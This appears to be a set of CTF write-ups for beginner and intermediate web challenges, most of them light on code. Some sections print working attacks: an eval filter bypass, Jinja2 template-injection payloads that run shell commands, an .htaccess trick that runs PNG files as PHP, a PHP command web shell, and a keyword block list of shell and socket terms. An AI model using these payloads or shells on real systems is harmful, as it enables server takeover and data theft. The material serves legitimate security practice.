WEB!

<details><summary></summary></details>
<details><summary>3v@l</summary>


So according to this convinient comment, theres 2 things to bypass, the word restriction and some regex checks 
```
    TODO
    ------------
    Secure python_flask eval execution by 
        1.blocking malcious keyword like os,eval,exec,bind,connect,python,socket,ls,cat,shell,bind
        2.Implementing regex: r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'

REGEX EXPLANATION
    0x[0-9A-Fa-f]+		catches strings matching 0x followed by 1 or more (represented by +)  characters 
    |				OR
    \\u[0-9A-Fa-f]{4}	catches strings matching \u followed by 4 or more (represented by {4}) characters
    |				OR
    %[0-9A-Fa-f]{2}		string must match % following by 2  (represented by {2}) charracters
    |				OR
    \.[A-Za-z0-9]{1,3}\b	catches file extension to match 1 or 3 characters (represented by {1,3})
    |				OR
    [\\\/]			catches a \ or / 
    |				OR
    \.\.			this apparently is 2 . escaped by the \, which catches intsances of ..

```





After a bunch of revisiting python basics and trials, found a payload that works as the hints shows the fag is at /flag.txt. Using this final payload read the text file. 
```open(__import__("base64").b64decode("L2ZsYWcudHh0").decode()).read()```

<img width="970" height="673" alt="image" src="https://github.com/user-attachments/assets/0bbb3c2b-7411-4935-aec6-542958e31ba9" />

<img width="992" height="540" alt="image" src="https://github.com/user-attachments/assets/a817c2a7-c13a-4d5a-baad-a524f4cfc25c" />

<img width="970" height="673" alt="image" src="https://github.com/user-attachments/assets/ef059070-c73f-4933-8c1f-61939369c30c" />

</details>

<details><summary>SSTI2</summary>

<img width="1081" height="715" alt="image" src="https://github.com/user-attachments/assets/c64512af-077a-4625-b871-b7a9e5d7bb9a" />
<img width="1081" height="715" alt="image" src="https://github.com/user-attachments/assets/73465771-bc97-48e2-b137-0a74e8299109" />
Funny that it can act as a calculator tho

<img width="992" height="540" alt="image" src="https://github.com/user-attachments/assets/5964d474-221c-49c3-9bd0-e0766d80b679" />


After some testing, it appears to just straight out remove ```_ . [] ()``` from requests. And in other cases, using things like ```__global__``` or ```.read()``` will get flagged too. Using the ppower of searching online, we have disovered an insane payload. 

ref:https://onsecurity.io/article/server-side-template-injection-with-jinja2/ 
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```


</details>



<details><summary>byp4ss3d</summary>

> apache vuln regrding htaccess
> allows for uploading a file to replce it =)

<img width="1586" height="759" alt="image" src="https://github.com/user-attachments/assets/d9a87ddb-0692-453d-828e-7df0645b9321" />
upload a htaccess file and alter the request with burp cuz cant find the file with . in front of it using gui. The following line will make the server trat png files as php
```AddHandler application/x-httpd-php .png```

<img width="1586" height="759" alt="image" src="https://github.com/user-attachments/assets/5f409ade-bb0d-435d-82a4-a495a006fa71" />
Next is the web shell, 
```
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

<form method="GET">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
```

<img width="1140" height="366" alt="image" src="https://github.com/user-attachments/assets/11d1d454-bf66-4e54-9f1b-f3502a318e6e" />
<img width="1140" height="366" alt="image" src="https://github.com/user-attachments/assets/43711bb3-98b8-475e-8ff2-62df43dd96aa" />

with web shell access and a little exploring

<img width="964" height="534" alt="image" src="https://github.com/user-attachments/assets/275d5fc3-afdb-43da-a017-334e4b09c63a" />


</details>

<details><summary>Crack the Gate 2</summary>
So got rate limiting, i see....

Refering to these 2 
- https://portswigger.net/web-security/race-conditions/lab-race-conditions-bypassing-rate-limits
- https://portswigger.net/burp/documentation/desktop/tools/repeater/groups#creating-a-new-tab-group

<img width="1586" height="759" alt="image" src="https://github.com/user-attachments/assets/afc62044-48be-41d3-8ba7-bbd806e20f33" />

<img width="963" height="556" alt="image" src="https://github.com/user-attachments/assets/a4d812c2-d3e7-4cce-956b-392b8bd84da9" />

</details>


Easy 
-
<details><summary>GET aHEAD</summary>

<img width="1918" height="878" alt="image" src="https://github.com/user-attachments/assets/e72955f1-0ddb-4ec2-a98e-fc6e758afc6a" />
So apparently, GET means red, POST means blue, OPTIONS mean ?, and WHAT DOES THE HEAD MEAN 

<img width="1261" height="512" alt="image" src="https://github.com/user-attachments/assets/b26c687a-372d-4b23-995d-ec3bdc633def" />

<img width="972" height="450" alt="image" src="https://github.com/user-attachments/assets/4dd0c7e9-47b3-4822-bb25-804517ff8eba" />

</details>

<details><summary>IntroToBurp</summary>

Hint says send malformed requests, something that is sometimes forgotten as errors can reveal information
<img width="1581" height="629" alt="image" src="https://github.com/user-attachments/assets/3178aef9-76e1-41e0-8e77-5cd2427f255c" />
<img width="1581" height="629" alt="image" src="https://github.com/user-attachments/assets/ccbf8838-c367-4003-9b09-d44028e5cbf9" />

<img width="954" height="483" alt="image" src="https://github.com/user-attachments/assets/fe169865-580e-4f67-a2ac-31a025350c78" />


</details>


<details><summary>dont-use-client-side</summary>

<img width="992" height="441" alt="image" src="https://github.com/user-attachments/assets/068cea4e-0d2b-47c5-83a8-39e1d4955a3a" />
After a bunch or rearranging......

<img width="992" height="441" alt="image" src="https://github.com/user-attachments/assets/a840a0a3-752f-4726-b54a-690654c499b6" />

</details>



<details><summary>logon</summary>

<img width="1300" height="652" alt="image" src="https://github.com/user-attachments/assets/884af291-8c42-4fcf-bdfd-dba67ced7a8c" />
Change admin to true and refresh 
<img width="995" height="329" alt="image" src="https://github.com/user-attachments/assets/97668284-3537-466c-8aa0-df284a07e353" />

<img width="952" height="490" alt="image" src="https://github.com/user-attachments/assets/4edfc722-a8fc-46f3-9d49-357d1600c86b" />



</details>

<details><summary>Insp3ct0r</summary>
<img width="1817" height="796" alt="image" src="https://github.com/user-attachments/assets/ea765090-f624-4eeb-879b-e6f86ad4d423" />
      
<img width="952" height="490" alt="image" src="https://github.com/user-attachments/assets/15de4f03-189d-4fad-b032-7422ba46a890" />

</details>

<details><summary>where are the robots</summary>

Access robots.txt to find the disallowed page 
<img width="961" height="458" alt="image" src="https://github.com/user-attachments/assets/880ff1cb-3a6e-471c-94f9-abf92e5bbf8c" />

<img width="961" height="458" alt="image" src="https://github.com/user-attachments/assets/0831e2d1-13cd-4eb7-97e0-4128a2e2725b" />

</details>


<details><summary>Scavenger Hunt</summary>

<img width="1769" height="730" alt="image" src="https://github.com/user-attachments/assets/b1e34605-573b-423a-ad63-671f6a683c2a" />
<img width="872" height="168" alt="image" src="https://github.com/user-attachments/assets/35eb390a-f562-468a-9b14-a29f95158f00" />
<img width="872" height="168" alt="image" src="https://github.com/user-attachments/assets/7180c082-bbb2-435e-b43f-0e80fbeeddfa" />

yes i read the last part up......

<img width="961" height="458" alt="image" src="https://github.com/user-attachments/assets/e92415b1-02bc-4c28-9253-3a0ebf19570e" />
Would have ran some fuzzer if not for the hint

</details>


<details><summary>Cookies</summary>

This one is just annoying 

<img width="1211" height="619" alt="image" src="https://github.com/user-attachments/assets/fceb267a-4f1a-445f-a05d-785dba1b6c5b" />
<img width="1211" height="619" alt="image" src="https://github.com/user-attachments/assets/1296594c-c3e6-4a96-8e4c-9ccfbbc4713f" />


<img width="1241" height="654" alt="image" src="https://github.com/user-attachments/assets/0b0483ca-68a0-4613-8ee2-69fe833f8217" />
<img width="1241" height="654" alt="image" src="https://github.com/user-attachments/assets/c2426a86-5023-4efa-ba12-8e6793dcf5a3" />
Simply saying, this value for the cookie "name" will keep changing if you put in different cookies. 

<img width="1562" height="642" alt="image" src="https://github.com/user-attachments/assets/5ce10cdd-e2dd-4610-8014-b1211365475e" />
So by bruteforcing through each cookie starting from value 1, i now have a database of the cookies, and the flag too on the 18th try 

<img width="990" height="440" alt="image" src="https://github.com/user-attachments/assets/63e117b8-db0f-4787-bcb7-1ac1b862d18a" />

</details>

<details><summary>Includes</summary>

<img width="774" height="453" alt="image" src="https://github.com/user-attachments/assets/6426f11e-f07c-4a2d-b504-d2d885b860fa" />
Since it says on include, which is like using code from a different file.... click all the underlined text to reassemble the flag. 

<img width="994" height="336" alt="image" src="https://github.com/user-attachments/assets/3c133157-b42d-400b-ba76-75a0b1e741d6" />

<img width="981" height="521" alt="image" src="https://github.com/user-attachments/assets/a113e64c-7cca-49c5-bd49-61bd952e47e5" />

</details>

<details><summary>Inspect HTML</summary>
      
no comment, but will document 
<img width="583" height="472" alt="image" src="https://github.com/user-attachments/assets/03b92c93-93b1-4476-b973-98e9fa0ad7d7" />
<img width="983" height="463" alt="image" src="https://github.com/user-attachments/assets/5afcacdb-efb3-4233-97e1-15084f8552b0" />

</details>

<details><summary>Local Authority</summary>

<img width="594" height="326" alt="image" src="https://github.com/user-attachments/assets/424b8336-21ed-4ccc-b2a8-3dfa6ee70250" />
Lovely customer portal you have, lets try to login 

<img width="594" height="326" alt="image" src="https://github.com/user-attachments/assets/4ba03e6f-afe7-47d7-bb80-9999a27ed943" />

After failing to login, the page displays this,, however the checkPassword function is not on the page. Its linked on a different .js file which can also be reached and in there is the final function that shows the correct set of credentials 
<img width="594" height="326" alt="image" src="https://github.com/user-attachments/assets/2a011a33-5667-4ef3-bcb4-ab451daeaa06" />

'''

      function filter(string) {
        filterPassed = true;
        for (let i =0; i < string.length; i++){
          cc = string.charCodeAt(i);
          
          if ( (cc >= 48 && cc <= 57) ||
               (cc >= 65 && cc <= 90) ||
               (cc >= 97 && cc <= 122) )
          {
            filterPassed = true;     
          }
          else
          {
            return false;
          }
        }
        
        return true;
      }
    
      window.username = "wihlelmina";
      window.password = "frost";
      
      usernameFilterPassed = filter(window.username);
      passwordFilterPassed = filter(window.password);
      
      if ( usernameFilterPassed && passwordFilterPassed ) {
      
        loggedIn = checkPassword(window.username, window.password);
        
        if(loggedIn)
        {
          document.getElementById('msg').innerHTML = "Log In Successful";
          document.getElementById('adminFormHash').value = "2196812e91c29df34f5e217cfd639881";
          document.getElementById('hiddenAdminForm').submit();
        }
        else
        {
          document.getElementById('msg').innerHTML = "Log In Failed";
        }
      }
      else {
        document.getElementById('msg').innerHTML = "Illegal character in username or password."
      }
'''
<img width="972" height="523" alt="image" src="https://github.com/user-attachments/assets/2936ccdd-ebde-4c37-a4cc-bc03f59a9391" />




</details>
<details><summary>Bookmarklet</summary>

<img width="1051" height="631" alt="image" src="https://github.com/user-attachments/assets/4d072a2b-7f59-4ccd-b833-a77fecf6303c" />

This again, but this time, its some javascript, copied it, put it into a new html file and ran it locally, got the flag. 

Got confused and apparently, i forgot i could also run javascript on the terminal and apparently thats how most writeups do it.... Makes my methos stupid but unique in a way. 
<img width="1051" height="631" alt="image" src="https://github.com/user-attachments/assets/d813f73b-65c6-408a-ba33-33f9c6d6f503" />

<img width="960" height="498" alt="image" src="https://github.com/user-attachments/assets/30acacca-0acd-4e39-8524-6ab33e084773" />
</details>


<details><summary>Unminify</summary>

<img width="1148" height="500" alt="image" src="https://github.com/user-attachments/assets/47cbbf58-f1b9-4527-af88-a41d58298db0" />
<img width="1123" height="94" alt="image" src="https://github.com/user-attachments/assets/45a3f8e2-cd7f-410c-a056-c8f32aa53232" />
Literally no explanation needed. 

<img width="1148" height="500" alt="image" src="https://github.com/user-attachments/assets/a39b8169-b5a8-442f-8b1a-e7c899a4e168" />
</details>



<details><summary>WebDecode</summary>


<img width="773" height="253" alt="image" src="https://github.com/user-attachments/assets/267ca65b-8983-43d4-8af9-652498ff71fb" />
<img width="1148" height="500" alt="image" src="https://github.com/user-attachments/assets/1d297096-668a-4eea-9bff-7a29ea6f24ec" />

<img width="964" height="564" alt="image" src="https://github.com/user-attachments/assets/22b32685-4b1c-47a9-a765-6cb2ddce2627" />

</details>



<details>  
<summary>SSTI1</summary>

> Server side template injection
> Mainly used on python web servers which render template
> injects malicious code into the template 


![image](https://github.com/user-attachments/assets/60163473-6ed8-4442-8022-7c3a68a6dbc1)
![image](https://github.com/user-attachments/assets/30d058a5-cf52-4a91-a8e1-ba13e75ab2ee)


Announcement website, COOL

ITS TIME TO ANNOUNCE THAT IM GA...


So now we announce that 60 + 9 is 

69 

NICE

This confirms the vulnerability, Server side template injection. Which also is literlly the hint.

![image](https://github.com/user-attachments/assets/9e8b5a4c-03e4-43ac-a707-9b05dcc69611)
![image](https://github.com/user-attachments/assets/6baa1558-8716-4d86-be16-18469ac0b609)

Heres some code thats not mine, but i know it allows to run any shell commands 

```{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}```
![image](https://github.com/user-attachments/assets/1832d8e9-5f34-403c-a26c-94be10fa72c3)

and now we just cat that file and done ! 

![image](https://github.com/user-attachments/assets/17f52e53-6760-4834-818e-6e3d82d8d416)

</details>



<details>
<summary>n0s4n1ty 1</summary>

> File upload exploit
> not sanitizing user input causing RCE

![image](https://github.com/user-attachments/assets/1f9d22df-172d-4644-959f-80f14288176d)
 
nice pic bro 

![image](https://github.com/user-attachments/assets/b08a92ef-7f24-4754-b68c-369cc7af8d38)
![image](https://github.com/user-attachments/assets/ee05a9d6-74ec-4687-afeb-b935cf883dfe)

Uploaded and to no surprise, we can see the image in there =)

![image](https://github.com/user-attachments/assets/ab94b8a6-c2a3-43f2-bb8d-36ccf3499a5e)
![image](https://github.com/user-attachments/assets/c66b006a-c662-423d-831d-27ef3baa94bf)

Uploaded, acessible and rendered. 

TIME TO USE CHINA'S LATEST TECHNOLOGY: DEEPSEEK

With a simple webshell it generated, we can start executing commands on their server and navigate the files

```
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

<form method="GET">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
```

![image](https://github.com/user-attachments/assets/dcc13ce5-d8c3-42e6-abce-0324f1d4021d)

```cd ../../../../; sudo cat /root/flag.txt```

By executing this command, we are able to read the flag file in the /root directory, of course, with sudo 

![image](https://github.com/user-attachments/assets/34e69ca6-3686-4c9d-b7bc-0f3802d7a0fe)

![image](https://github.com/user-attachments/assets/a1c909ff-b789-4949-a444-fcc9c0404b8d)


</details>

<details>
<summary>Crack the Gate 1</summary>

<img width="946" height="638" alt="image" src="https://github.com/user-attachments/assets/429cbd3b-ce98-4ff5-983b-c19771bf99c5" />
<img width="946" height="638" alt="image" src="https://github.com/user-attachments/assets/311a1946-1546-4f9d-b644-26b881ef229e" />

so got login page , but no acccess. 

```
 <!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

Some comments found in the html
 after decoding , you get ```NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes```

<img width="1226" height="477" alt="image" src="https://github.com/user-attachments/assets/584575b0-22ee-4420-8537-eebc741c9262" />

 So just add the header and done 

</details>

<details>
<summary> 
Cookie Monster Secret Recipe
</summary>

found the cookie, now what? 
<img width="1918" height="878" alt="image" src="https://github.com/user-attachments/assets/685f8a0c-603a-4023-8b5b-e2dc8ee40b5a" />

took some thought, but the %3D in the end kinda gave it away as url encoded
<img width="1238" height="505" alt="image" src="https://github.com/user-attachments/assets/851c413c-52d5-4c82-9b92-45b7e57f58b2" />

  <img width="1226" height="477" alt="image" src="https://github.com/user-attachments/assets/6db70677-71b0-4219-98c1-2acfe156b940" />
</details>
